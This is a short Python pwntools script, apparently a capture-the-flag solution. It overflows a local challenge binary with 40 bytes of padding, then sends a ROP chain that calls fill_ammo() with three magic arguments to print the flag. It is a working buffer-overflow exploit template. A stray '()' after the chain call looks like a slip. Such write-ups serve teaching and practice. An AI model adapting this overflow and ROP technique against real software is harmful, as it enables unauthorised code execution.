# A ROP chain 


# context: there is a function fill_ammo() that prints the flag
# but it wants the arguments 0xdeadbeef,0xdeadbabe,0xdead1337

import pwn

exe = pwn.ELF("./rocket_blaster_xxx_patched") # Path to excecutable
pwn.context.binary = exe # type of executable

p = pwn.process(exe.path) # Connect to the process (to interact with it)
r = pwn.ROP([exe]) # begin crafting ROP chain
r.raw(r.find_gadget(["ret"])[0]) # chain needs to start with a 'ret' due to stack alignment issues
r.fill_ammo(0xdeadbeef,0xdeadbabe,0xdead1337) ()

p.sendlineafter("XXX",b"A"*40+r.chain())
p.interactive()